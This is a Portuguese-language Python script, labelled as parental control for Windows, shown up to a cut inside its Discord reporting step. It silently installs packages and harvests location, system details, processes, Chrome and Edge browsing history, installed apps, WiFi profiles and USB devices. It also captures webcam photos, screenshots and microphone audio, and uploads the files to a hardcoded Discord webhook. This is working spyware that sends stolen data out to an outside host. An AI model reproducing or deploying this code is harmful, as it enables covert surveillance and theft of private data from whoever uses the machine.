#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CONTROLE PARENTAL - WINDOWS
"""

import subprocess
import sys
import os

# ========== INSTALAR DEPENDENCIAS ==========
print("\n[*] A verificar dependencias...\n")

PACOTES = ["psutil", "pillow", "opencv-python", "sounddevice", "scipy", "numpy", "pyautogui"]

for pacote in PACOTES:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "-q", pacote],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"    [OK] {pacote}")
    except:
        print(f"    [--] {pacote} (opcional)")

print("\n[+] Dependencias OK!\n")

# ========== IMPORTS ==========
import time
import json
import platform
import shutil
import sqlite3
import ctypes
from datetime import datetime
from pathlib import Path
from urllib.request import Request, urlopen

import psutil

# Imports opcionais
try:
    from PIL import ImageGrab
    import pyautogui
    TEM_SCREENSHOT = True
except:
    TEM_SCREENSHOT = False

try:
    import cv2
    TEM_CAMERA = True
except:
    TEM_CAMERA = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    import numpy as np
    TEM_AUDIO = True
except:
    TEM_AUDIO = False

try:
    import winreg
    TEM_WINREG = True
except:
    TEM_WINREG = False

# ========== CONFIGURACAO ==========
WEBHOOK = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"

HOME = str(Path.home())
BASE_DIR = os.path.join(HOME, "ControleParental")
REPORT_DIR = os.path.join(BASE_DIR, "Relatorios")
AUDIO_DIR = os.path.join(BASE_DIR, "Audios")
FOTOS_DIR = os.path.join(BASE_DIR, "Fotos")

INTERVALO_MINUTOS = 30

# Criar pastas
for pasta in [REPORT_DIR, AUDIO_DIR, FOTOS_DIR]:
    os.makedirs(pasta, exist_ok=True)

# ========== FUNCOES AUXILIARES ==========
def timestamp():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def hora_atual():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")

# ========== DISCORD ==========
def discord_texto(titulo, descricao, cor=3447003):
    """Envia mensagem de texto para Discord."""
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],
                "color": cor,
                "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                "footer": {"text": "Controle Parental | Windows"}
            }]
        }
        dados = json.dumps(embed).encode("utf-8")
        req = Request(WEBHOOK, data=dados)
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0")
        response = urlopen(req, timeout=30)
        if response.status == 204:
            print("[+] Discord: Mensagem enviada!")
            return True
    except Exception as e:
        print(f"[-] Discord erro: {e}")
    return False

def discord_arquivo(caminho, mensagem=""):
    """Envia arquivo para Discord."""
    try:
        if not os.path.exists(caminho):
            return False
        
        with open(caminho, "rb") as f:
            conteudo = f.read()
        
        nome = os.path.basename(caminho)
        boundary = f"----WebKitFormBoundary{int(time.time())}"
        
        body = b""
        
        if mensagem:
            body += f"--{boundary}\r\n".encode()
            body += b'Content-Disposition: form-data; name="content"\r\n\r\n'
            body += mensagem.encode("utf-8") + b"\r\n"
        
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{nome}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += conteudo + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        
        req = Request(WEBHOOK, data=body)
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        req.add_header("User-Agent", "Mozilla/5.0")
        
        response = urlopen(req, timeout=120)
        if response.status == 200:
            print(f"[+] Discord: {nome} enviado!")
            return True
    except Exception as e:
        print(f"[-] Erro envio arquivo: {e}")
    return False

# ========== COLETA DE DADOS ==========

def obter_localizacao():
    """Obtem localizacao via IP."""
    try:
        req = Request("http://ip-api.com/json/")
        req.add_header("User-Agent", "Mozilla/5.0")
        response = urlopen(req, timeout=10)
        dados = json.loads(response.read().decode())
        
        if dados.get("status") == "success":
            return {
                "ip": dados.get("query", "?"),
                "cidade": dados.get("city", "?"),
                "regiao": dados.get("regionName", "?"),
                "pais": dados.get("country", "?"),
                "isp": dados.get("isp", "?"),
                "lat": dados.get("lat", "?"),
                "lon": dados.get("lon", "?")
            }
    except:
        pass
    return {}

def obter_info_sistema():
    """Informacoes do sistema."""
    try:
        mem = psutil.virtual_memory()
        disco = psutil.disk_usage("C:\\")
        bat = psutil.sensors_battery()
        boot = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot
        
        return {
            "sistema": f"Windows {platform.release()} ({platform.version()})",
            "computador": platform.node(),
            "usuario": os.environ.get("USERNAME", "?"),
            "processador": platform.processor()[:50],
            "cpu_nucleos": psutil.cpu_count(),
            "cpu_uso": f"{psutil.cpu_percent(interval=1)}%",
            "ram_total": f"{mem.total / (1024**3):.1f} GB",
            "ram_usada": f"{mem.used / (1024**3):.1f} GB",
            "ram_percent": f"{mem.percent}%",
            "disco_total": f"{disco.total / (1024**3):.0f} GB",
            "disco_usado": f"{disco.used / (1024**3):.0f} GB",
            "disco_percent": f"{disco.percent}%",
            "bateria": f"{bat.percent}%" if bat else "Sem bateria",
            "a_carregar": "Sim" if bat and bat.power_plugged else "Nao" if bat else "N/A",
            "ligado_desde": boot.strftime("%d/%m/%Y %H:%M"),
            "tempo_ligado": str(uptime).split(".")[0]
        }
    except Exception as e:
        return {"erro": str(e)}

def listar_processos():
    """Lista processos ativos."""
    try:
        processos = []
        for proc in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent", "username"]):
            try:
                info = proc.info
                mem = info.get("memory_percent", 0) or 0
                if mem > 0.1:
                    processos.append({
                        "nome": info["name"],
                        "pid": info["pid"],
                        "ram": round(mem, 1),
                        "user": info.get("username", "?")
                    })
            except:
                continue
        
        processos.sort(key=lambda x: x["ram"], reverse=True)
        return processos[:40]
    except:
        return []

def obter_historico_chrome():
    """Historico do Chrome."""
    historico = []
    try:
        chrome_path = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        
        if os.path.exists(chrome_path):
            temp = os.path.join(REPORT_DIR, f"chrome_temp_{int(time.time())}.db")
            shutil.copy2(chrome_path, temp)
            
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime')
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 100
            """)
            
            for url, titulo, data in cursor.fetchall():
                historico.append({
                    "titulo": (titulo or "Sem titulo")[:50],
                    "url": url[:100],
                    "data": data
                })
            
            conn.close()
            os.remove(temp)
    except:
        pass
    return historico

def obter_historico_edge():
    """Historico do Edge."""
    historico = []
    try:
        edge_path = os.path.join(HOME, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
        
        if os.path.exists(edge_path):
            temp = os.path.join(REPORT_DIR, f"edge_temp_{int(time.time())}.db")
            shutil.copy2(edge_path, temp)
            
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime')
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 100
            """)
            
            for url, titulo, data in cursor.fetchall():
                historico.append({
                    "titulo": (titulo or "Sem titulo")[:50],
                    "url": url[:100],
                    "data": data
                })
            
            conn.close()
            os.remove(temp)
    except:
        pass
    return historico

def obter_apps_instaladas():
    """Lista apps instaladas."""
    apps = []
    
    if not TEM_WINREG:
        return apps
    
    try:
        caminhos = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        
        for hkey, caminho in caminhos:
            try:
                chave = winreg.OpenKey(hkey, caminho)
                for i in range(winreg.QueryInfoKey(chave)[0]):
                    try:
                        nome_sub = winreg.EnumKey(chave, i)
                        sub_chave = winreg.OpenKey(chave, nome_sub)
                        
                        try:
                            nome = winreg.QueryValueEx(sub_chave, "DisplayName")[0]
                            if nome and nome not in apps:
                                apps.append(nome)
                        except:
                            pass
                        
                        winreg.CloseKey(sub_chave)
                    except:
                        continue
                winreg.CloseKey(chave)
            except:
                continue
    except:
        pass
    
    apps.sort()
    return apps[:200]

def obter_redes_wifi():
    """Lista redes WiFi conhecidas."""
    redes = []
    try:
        output = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10
        )
        
        for linha in output.stdout.split("\n"):
            if "Perfil de Todos os" in linha or "All User Profile" in linha:
                partes = linha.split(":")
                if len(partes) > 1:
                    rede = partes[1].strip()
                    if rede:
                        redes.append(rede)
    except:
        pass
    return redes

def obter_usb():
    """Lista dispositivos USB."""
    dispositivos = []
    try:
        output = subprocess.run(
            ["wmic", "path", "Win32_USBHub", "get", "Name"],
            capture_output=True, text=True, timeout=10
        )
        
        for linha in output.stdout.split("\n"):
            linha = linha.strip()
            if linha and linha != "Name":
                dispositivos.append(linha)
    except:
        pass
    return dispositivos[:20]

def obter_programas_inicializacao():
    """Programas que iniciam com Windows."""
    programas = []
    
    if not TEM_WINREG:
        return programas
    
    try:
        caminhos = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        ]
        
        for hkey, caminho in caminhos:
            try:
                chave = winreg.OpenKey(hkey, caminho)
                i = 0
                while True:
                    try:
                        nome, valor, _ = winreg.EnumValue(chave, i)
                        programas.append(f"{nome}: {valor[:50]}")
                        i += 1
                    except:
                        break
                winreg.CloseKey(chave)
            except:
                continue
    except:
        pass
    
    return programas

# ========== CAPTURAS ==========

def capturar_screenshot():
    """Captura screenshot."""
    if not TEM_SCREENSHOT:
        print("[-] Screenshot: dependencias nao instaladas")
        return None
    
    try:
        arquivo = os.path.join(FOTOS_DIR, f"screenshot_{timestamp()}.png")
        
        # Metodo 1: pyautogui
        try:
            img = pyautogui.screenshot()
            img.save(arquivo)
            if os.path.exists(arquivo):
                print("[+] Screenshot capturado!")
                return arquivo
        except:
            pass
        
        # Metodo 2: PIL ImageGrab
        try:
            img = ImageGrab.grab()
            img.save(arquivo)
            if os.path.exists(arquivo):
                print("[+] Screenshot capturado!")
                return arquivo
        except:
            pass
        
    except Exception as e:
        print(f"[-] Erro screenshot: {e}")
    
    return None

def capturar_camera():
    """Captura foto da camera."""
    if not TEM_CAMERA:
        print("[-] Camera: OpenCV nao instalado")
        return None
    
    try:
        arquivo = os.path.join(FOTOS_DIR, f"camera_{timestamp()}.jpg")
        
        print("[*] A aceder a camera...")
        
        # Tenta diferentes indices de camera
        cap = None
        for i in range(3):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)  # CAP_DSHOW e melhor no Windows
            if cap.isOpened():
                print(f"[+] Camera {i} encontrada!")
                break
            cap.release()
        
        if not cap or not cap.isOpened():
            print("[-] Nenhuma camera encontrada")
            return None
        
        # Espera a camera estabilizar
        time.sleep(2)
        
        # Captura varios frames (o ultimo e melhor)
        for _ in range(10):
            ret, frame = cap.read()
        
        cap.release()
        
        if ret and frame is not None:
            cv2.imwrite(arquivo, frame)
            print("[+] Foto da camera capturada!")
            return arquivo
        else:
            print("[-] Falha ao capturar frame")
        
    except Exception as e:
        print(f"[-] Erro camera: {e}")
    
    return None

def capturar_audio(duracao=15):
    """Grava audio do microfone."""
    if not TEM_AUDIO:
        print("[-] Audio: dependencias nao instaladas")
        return None
    
    try:
        arquivo = os.path.join(AUDIO_DIR, f"audio_{timestamp()}.wav")
        
        print(f"[*] A gravar audio ({duracao} segundos)...")
        
        # Configuracoes
        taxa = 44100
        canais = 1
        
        # Grava
        audio = sd.rec(
            int(duracao * taxa),
            samplerate=taxa,
            channels=canais,
            dtype="int16"
        )
        sd.wait()
        
        # Salva
        wavfile.write(arquivo, taxa, audio)
        
        print("[+] Audio gravado!")
        return arquivo
        
    except Exception as e:
        print(f"[-] Erro audio: {e}")
    
    return None

# ========== SALVAR RELATORIOS ==========

def salvar_relatorio(nome, dados):
    """Salva relatorio em TXT."""
    try:
        arquivo = os.path.join(REPORT_DIR, f"{nome}_{timestamp()}.txt")
        
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"  {nome.upper()}\n")
            f.write(f"  Gerado em: {hora_atual()}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f">>> {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        if isinstance(item, dict):
                            f.write(f"\n  [{i}]\n")
                            for k, v in item.items():
                                f.write(f"      {k}: {v}\n")
                        else:
                            f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for k, v in valor.items():
                        f.write(f"  {k}: {v}\n")
                else:
                    f.write(f"  {valor}\n")
                
                f.write("\n")
        
        print(f"[+] Relatorio salvo: {nome}")
        return arquivo
    
    except Exception as e:
        print(f"[-] Erro ao salvar: {e}")
        return None

# ========== EXECUCAO PRINCIPAL ==========

def executar_monitoramento():
    """Executa o monitoramento completo."""
    
    print("\n" + "=" * 60)
    print(f"  MONITORAMENTO INICIADO - {hora_atual()}")
    print("=" * 60 + "\n")
    
    # ===== COLETA DE DADOS =====
    print("[*] A recolher dados...\n")
    
    localizacao = obter_localizacao()
    print(f"    Localizacao: {localizacao.get('cidade', '?')}, {localizacao.get('pais', '?')}")
    
    sistema = obter_info_sistema()
    print(f"    Sistema: {sistema.get('sistema', '?')}")
    
    processos = listar_processos()
    print(f"    Processos: {len(processos)}")
    
    historico_chrome = obter_historico_chrome()
    print(f"    Historico Chrome: {len(historico_chrome)}")
    
    historico_edge = obter_historico_edge()
    print(f"    Historico Edge: {len(historico_edge)}")
    
    apps = obter_apps_instaladas()
    print(f"    Apps instaladas: {len(apps)}")
    
    wifi = obter_redes_wifi()
    print(f"    Redes WiFi: {len(wifi)}")
    
    usb = obter_usb()
    print(f"    USB: {len(usb)}")
    
    startup = obter_programas_inicializacao()
    print(f"    Startup: {len(startup)}")
    
    # ===== CAPTURAS =====
    print("\n[*] A fazer capturas...\n")
    
    foto_camera = capturar_camera()
    screenshot = capturar_screenshot()
    audio = capturar_audio(15)
    
    # ===== SALVAR RELATORIOS =====
    print("\n[*] A guardar relatorios...\n")
    
    arquivos = []
    
    if processos:
        a = salvar_relatorio("processos", {"Processos Ativos": processos})
        if a: arquivos.append(a)
    
    if historico_chrome:
        a = salvar_relatorio("historico_chrome", {"Sites Visitados": historico_chrome})
        if a: arquivos.append(a)
    
    if historico_edge:
        a = salvar_relatorio("historico_edge", {"Sites Visitados": historico_edge})
        if a: arquivos.append(a)
    
    if apps:
        a = salvar_relatorio("apps_instaladas", {"Aplicacoes": apps})
        if a: arquivos.append(a)
    
    if wifi:
        a = salvar_relatorio("redes_wifi", {"Redes Conhecidas": wifi})
        if a: arquivos.append(a)
    
    # ===== ENVIAR PARA DISCORD =====
    print("\n[*] A enviar para Discord...\n")
    
    # Mensagem principal
    msg = f"""
**📍 LOCALIZACAO**
